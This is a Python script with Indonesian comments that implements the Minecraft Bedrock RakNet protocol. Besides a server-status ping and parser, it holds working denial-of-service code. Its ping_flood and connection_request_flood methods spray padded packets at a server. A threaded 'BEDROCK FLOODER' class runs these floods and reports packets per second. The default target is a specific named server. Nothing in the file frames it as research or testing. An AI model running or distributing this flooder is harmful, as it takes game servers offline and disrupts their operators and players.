#!/usr/bin/env python3
"""
Minecraft Bedrock Edition Protocol (RakNet) Implementation
UDP-based protocol untuk MC Bedrock / Pocket Edition
"""

import socket
import struct
import time
import random
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed


class RakNetBuffer:
    """Buffer untuk RakNet packet encoding/decoding"""
    
    def __init__(self, data=b""):
        self.data = data
        self.pos = 0
    
    def write_byte(self, value):
        self.data += struct.pack(">b", value)
        return self
    
    def write_ubyte(self, value):
        self.data += struct.pack(">B", value)
        return self
    
    def write_ushort(self, value):
        self.data += struct.pack(">H", value)
        return self
    
    def write_uint(self, value):
        self.data += struct.pack(">I", value)
        return self
    
    def write_ulong(self, value):
        self.data += struct.pack(">Q", value)
        return self
    
    def write_long(self, value):
        self.data += struct.pack(">q", value)
        return self
    
    def write_magic(self):
        """RakNet magic bytes"""
        self.data += b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
        return self
    
    def write_string(self, value):
        encoded = value.encode("utf-8")
        self.write_ushort(len(encoded))
        self.data += encoded
        return self
    
    def read_byte(self):
        result = struct.unpack(">b", self.data[self.pos:self.pos+1])[0]
        self.pos += 1
        return result
    
    def read_ubyte(self):
        result = struct.unpack(">B", self.data[self.pos:self.pos+1])[0]
        self.pos += 1
        return result
    
    def read_ushort(self):
        result = struct.unpack(">H", self.data[self.pos:self.pos+2])[0]
        self.pos += 2
        return result
    
    def read_uint(self):
        result = struct.unpack(">I", self.data[self.pos:self.pos+4])[0]
        self.pos += 4
        return result
    
    def read_ulong(self):
        result = struct.unpack(">Q", self.data[self.pos:self.pos+8])[0]
        self.pos += 8
        return result
    
    def read_long(self):
        result = struct.unpack(">q", self.data[self.pos:self.pos+8])[0]
        self.pos += 8
        return result
    
    def read_magic(self):
        magic = self.data[self.pos:self.pos+16]
        self.pos += 16
        return magic
    
    def read_string(self):
        length = self.read_ushort()
        result = self.data[self.pos:self.pos+length].decode("utf-8", errors="replace")
        self.pos += length
        return result


# RakNet Packet IDs
RAKNET_UNCONNECTED_PING = 0x01
RAKNET_UNCONNECTED_PONG = 0x1c
RAKNET_OPEN_CONNECTION_REQUEST_1 = 0x05
RAKNET_OPEN_CONNECTION_REPLY_1 = 0x06
RAKNET_OPEN_CONNECTION_REQUEST_2 = 0x07
RAKNET_OPEN_CONNECTION_REPLY_2 = 0x08


class BedrockProtocol:
    """Minecraft Bedrock Protocol (RakNet) Client"""
    
    MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
    
    def __init__(self, host, port=19132):
        self.host = host
        self.port = port
        self.sock = None
    
    def _create_socket(self):
        """Create UDP socket"""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        return s
    
    def ping(self):
        """Kirim unconnected ping dan terima pong"""
        try:
            sock = self._create_socket()
            
            # Build unconnected ping packet
            buf = RakNetBuffer()
            buf.write_ubyte(RAKNET_UNCONNECTED_PING)  # Packet ID
            buf.write_long(int(time.time() * 1000))    # Timestamp
            buf.write_magic()                          # Magic
            buf.write_ulong(0)                         # Client GUID
            
            sock.sendto(buf.data, (self.host, self.port))
            
            # Receive pong
            data, addr = sock.recvfrom(4096)
            sock.close()
            
            # Parse pong
            return self._parse_pong(data)
            
        except socket.timeout:
            return {"error": "Timeout - server tidak merespons"}
        except Exception as e:
            return {"error": str(e)}
    
    def _parse_pong(self, data):
        """Parse unconnected pong packet"""
        try:
            buf = RakNetBuffer(data)
            
            packet_id = buf.read_ubyte()
            if packet_id != RAKNET_UNCONNECTED_PONG:
                return {"error": f"Bukan pong packet: 0x{packet_id:02x}"}
            
            timestamp = buf.read_long()
            server_guid = buf.read_ulong()
            magic = buf.read_magic()
            string_data = buf.read_string()
            
            # Parse server info string
            # Format: MCPE;Motd;Protocol;Version;Players;MaxPlayers;ServerUniqueId;WorldName;GameMode;Port;Port
            parts = string_data.split(";")
            
            if len(parts) >= 11:
                return {
                    "edition": parts[0],
                    "motd": parts[1],
                    "protocol_version": parts[2],
                    "version": parts[3],
                    "players_online": int(parts[4]),
                    "players_max": int(parts[5]),
                    "server_guid": server_guid,
                    "world_name": parts[7],
                    "game_mode": parts[8],
                    "port_ipv4": parts[9],
                    "port_ipv6": parts[10],
                    "raw": string_data
                }
            else:
                return {
                    "raw": string_data,
                    "parts": parts,
                    "server_guid": server_guid
                }
                
        except Exception as e:
            return {"error": f"Parse error: {str(e)}", "raw_hex": data.hex()[:100]}
    
    def connection_request_flood(self, count=100, delay=0.01):
        """Flood server dengan connection requests"""
        sent = 0
        errors = 0
        
        try:
            sock = self._create_socket()
            sock.settimeout(1)
            
            for i in range(count):
                try:
                    # Open Connection Request 1
                    buf = RakNetBuffer()
                    buf.write_ubyte(RAKNET_OPEN_CONNECTION_REQUEST_1)
                    buf.write_magic()
                    buf.write_ubyte(0)  # Protocol version
                    
                    # Padding untuk MTU
                    padding = b"\x00" * random.randint(100, 1400)
                    buf.data += padding
                    
                    sock.sendto(buf.data, (self.host, self.port))
                    sent += 1
                    
                    if delay > 0:
                        time.sleep(delay)
                        
                except Exception as e:
                    errors += 1
            
            sock.close()
            
        except Exception as e:
            return {"sent": sent, "errors": errors, "error": str(e)}
        
        return {"sent": sent, "errors": errors}
    
    def ping_flood(self, count=100, delay=0.01):
        """Flood server dengan unconnected pings"""
        sent = 0
        errors = 0
        responses = 0
        
        try:
            sock = self._create_socket()
            sock.settimeout(1)
            
            for i in range(count):
                try:
                    buf = RakNetBuffer()
                    buf.write_ubyte(RAKNET_UNCONNECTED_PING)
                    buf.write_long(int(time.time() * 1000))
                    buf.write_magic()
                    buf.write_ulong(random.getrandbits(64))  # Random GUID
                    
                    sock.sendto(buf.data, (self.host, self.port))
                    sent += 1
                    
                    # Try to receive (non-blocking check)
                    try:
                        data, addr = sock.recvfrom(4096)
                        responses += 1
                    except socket.timeout:
                        pass
                    
                    if delay > 0:
                        time.sleep(delay)
                        
                except Exception as e:
                    errors += 1
            
            sock.close()
            
        except Exception as e:
            return {"sent": sent, "errors": errors, "error": str(e)}
        
        return {"sent": sent, "errors": errors, "responses": responses}


class BedrockSpammer:
    """Bedrock Server Connection Flooder"""
    
    def __init__(self, target_host, target_port=19132):
        self.host = target_host
        self.port = target_port
        self.running = False
        self.packets_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
    
    def _flood_worker(self, count, delay, flood_type):
        """Worker thread untuk flood"""
        protocol = BedrockProtocol(self.host, self.port)
        
        for i in range(count):
            if not self.running:
                break
            
            try:
                if flood_type == "ping":
                    result = protocol.ping_flood(count=1, delay=0)
                elif flood_type == "connect":
                    result = protocol.connection_request_flood(count=1, delay=0)
                else:
                    result = protocol.ping_flood(count=1, delay=0)
                
                with self.lock:
                    self.packets_sent += result.get("sent", 0)
                    self.errors += result.get("errors", 0)
                    
            except Exception as e:
                with self.lock:
                    self.errors += 1
            
            if delay > 0:
                time.sleep(delay)
    
    def start(self, num_threads=10, packets_per_thread=100, delay=0.01, flood_type="ping"):
        """Mulai flood"""
        self.running = True
        self.packets_sent = 0
        self.errors = 0
        
        print(f"\n{'='*60}")
        print(f"  BEDROCK FLOODER")
        print(f"{'='*60}")
        print(f"  Target   : {self.host}:{self.port}")
        print(f"  Threads  : {num_threads}")
        print(f"  Packets  : {packets_per_thread}/thread")
        print(f"  Type     : {flood_type}")
        print(f"  Delay    : {delay}s")
        print(f"{'='*60}\n")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            for i in range(num_threads):
                future = executor.submit(self._flood_worker, packets_per_thread, delay, flood_type)
                futures.append(future)
            
            # Monitor
            while self.running:
                time.sleep(2)
                elapsed = time.time() - start_time
                pps = self.packets_sent / max(elapsed, 1)
                print(f"[*] Sent: {self.packets_sent} | Errors: {self.errors} | "
                      f"PPS: {pps:.0f} | Time: {elapsed:.0f}s")
                
                # Check if all done
                if all(f.done() for f in futures):
                    break
        
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"  HASIL")
        print(f"{'='*60}")
        print(f"  Total Sent  : {self.packets_sent}")
        print(f"  Errors      : {self.errors}")
        print(f"  Duration    : {elapsed:.1f}s")
        print(f"  Avg PPS     : {self.packets_sent/max(elapsed,1):.0f}")
        print(f"{'='*60}\n")
        
        self.running = False
    
    def stop(self):
        self.running = False


if __name__ == "__main__":
    import sys
    
    host = sys.argv[1] if len(sys.argv) > 1 else "play.selyuxsmp.xyz"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 19132
    
    print(f"[*] Checking Bedrock server {host}:{port}...")
    
    protocol = BedrockProtocol(host, port)
    result = protocol.ping()
    
    if "error" not in result:
        print(f"\n[+] Server Info:")
        print(f"    Edition    : {result.get('edition', 'N/A')}")
        print(f"    MOTD       : {result.get('motd', 'N/A')}")
        print(f"    Version    : {result.get('version', 'N/A')}")
        print(f"    Protocol   : {result.get('protocol_version', 'N/A')}")
        print(f"    Players    : {result.get('players_online', 0)}/{result.get('players_max', 0)}")
        print(f"    Game Mode  : {result.get('game_mode', 'N/A')}")
        print(f"    World      : {result.get('world_name', 'N/A')}")
        print(f"    Raw        : {result.get('raw', 'N/A')}")
    else:
        print(f"[-] Error: {result['error']}")
